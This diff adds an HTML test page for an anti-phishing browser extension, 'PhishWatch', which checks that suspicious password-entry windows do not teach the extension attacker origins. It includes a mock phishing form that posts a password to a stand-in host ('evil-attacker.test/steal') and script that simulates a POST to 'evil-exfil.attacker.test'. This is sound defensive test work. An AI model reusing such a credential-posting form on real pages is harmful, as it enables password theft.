@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gate 3 Test: No Learn Suspicious Window</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 700px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #1a1a1a;
+      color: #e0e0e0;
+    }
+    .test-box {
+      background: #252525;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 30px;
+      margin: 20px 0;
+    }
+    .test-box.danger {
+      border-color: #5a2727;
+      background: #2a1a1a;
+    }
+    h1 { color: #4a9eff; }
+    label { display: block; margin-bottom: 8px; color: #aaa; }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #444;
+      border-radius: 8px;
+      background: #1a1a1a;
+      color: #fff;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    button {
+      padding: 14px 24px;
+      background: #ff6b6b;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    button.secondary {
+      background: #4a9eff;
+    }
+    .instructions {
+      background: #2a1e1e;
+      border: 1px solid #5a2727;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 20px;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .badge-gate3 { background: #27455a; color: #87ceeb; }
+    .badge-guarded { background: #5a2727; color: #ff6b6b; }
+    .warning-box {
+      background: #3a2a1a;
+      border: 1px solid #5a4a27;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+    }
+    code {
+      background: #333;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    a { color: #4a9eff; }
+    #status {
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+      display: none;
+    }
+    #status.warning {
+      display: block;
+      background: #2a1e1e;
+      border: 1px solid #5a2727;
+      color: #ff6b6b;
+    }
+  </style>
+</head>
+<body>
+  <h1>🛡️ Gate 3 Test: Guarded Learning</h1>
+  <p>
+    <span class="badge badge-gate3">Gate 3</span>
+    <span class="badge badge-guarded">GUARDED</span>
+    Suspicious windows should NOT learn attacker origins
+  </p>
+  
+  <div class="warning-box">
+    <strong>⚠️ Why Guarded Learning Matters</strong><br>
+    Without this protection, an attacker could:
+    <ol style="margin: 10px 0 0 0; padding-left: 20px;">
+      <li>Lure user to phishing page once</li>
+      <li>PhishWatch would "learn" attacker's exfil domain</li>
+      <li>Future attacks from same page would be silently allowed</li>
+    </ol>
+    <strong>Solution:</strong> Only learn from benign windows (no mismatch, no new origins).
+  </div>
+  
+  <div class="test-box danger">
+    <h3 style="color: #ff6b6b; margin-top: 0;">Step 1: Trigger Auth Window</h3>
+    <p style="color: #888;">Focus on password field to arm the treadmill</p>
+    
+    <!-- Form with suspicious action -->
+    <form id="phishing-form" action="https://evil-attacker.test/steal" method="POST">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Click here to arm treadmill">
+    </form>
+  </div>
+  
+  <div class="test-box danger">
+    <h3 style="color: #ff6b6b; margin-top: 0;">Step 2: Simulate Suspicious Activity</h3>
+    <p style="color: #888;">This simulates cross-origin network activity to an unknown destination</p>
+    
+    <button onclick="simulateSuspiciousActivity()">Simulate Suspicious POST</button>
+    <button onclick="checkStorage()" class="secondary">Check Storage</button>
+    
+    <div id="status"></div>
+  </div>
+  
+  <div class="instructions">
+    <strong>Instructions:</strong>
+    <ol>
+      <li>Open DevTools Console (F12)</li>
+      <li>Filter by <code>[PhishWatch</code></li>
+      <li>Click on the password field (Step 1)</li>
+      <li>Quickly click "Simulate Suspicious POST" (within 2 seconds)</li>
+      <li>Wait for treadmill to disarm</li>
+      <li>Verify you see:
+        <ul>
+          <li><code>form_action_origin_mismatch</code> signal (form action is suspicious)</li>
+          <li><code>novelty: NOT learning origins (suspicious indicators)</code></li>
+          <li><code>hasMismatch: true</code> OR <code>hasNewOrigin: true</code></li>
+        </ul>
+      </li>
+      <li>Click "Check Storage" - attacker origin should NOT be learned</li>
+    </ol>
+    <p><strong>Critical:</strong> The attacker origin (<code>https://evil-exfil.attacker.test</code>) should NOT appear in learned origins.</p>
+  </div>
+  
+  <p><a href="../index.html">← Back to Test Harness</a></p>
+  
+  <script>
+    function simulateSuspiciousActivity() {
+      // Simulate cross-origin POST to unknown destination
+      var event = new CustomEvent('phishwatch_net_event', {
+        detail: {
+          destination_origin: 'https://evil-exfil.attacker.test',
+          method: 'POST'
+        }
+      });
+      
+      window.dispatchEvent(event);
+      console.log('[Test] Dispatched suspicious cross-origin network event');
+      
+      document.getElementById('status').className = 'warning';
+      document.getElementById('status').innerHTML = '⚠️ Simulated suspicious POST to attacker origin.<br>Check console - should see "NOT learning origins"';
+    }
+    
+    function checkStorage() {
+      if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
+        chrome.storage.local.get(['pw_expected_origins_by_page_origin'], function(data) {
+          console.log('[Test] Expected Origins Storage:', data);
+          var pageOrigin = window.location.origin;
+          var entry = data.pw_expected_origins_by_page_origin && data.pw_expected_origins_by_page_origin[pageOrigin];
+          
+          if (entry && entry.origins) {
+            var hasAttacker = entry.origins.some(function(o) {
+              return o.indexOf('attacker') !== -1 || o.indexOf('evil') !== -1;
+            });
+            
+            if (hasAttacker) {
+              alert('❌ FAIL: Attacker origin was learned!\n\n' + JSON.stringify(entry, null, 2));
+            } else {
+              alert('✅ PASS: No attacker origins learned.\n\nLearned origins:\n' + JSON.stringify(entry.origins, null, 2));
+            }
+          } else {
+            alert('✅ PASS: No origins learned for this page (as expected for suspicious window).');
+          }
+        });
+      } else {
+        alert('Chrome storage not available.\nRun this test with the extension loaded.');
+      }
+    }
+  </script>
+</body>
+</html>
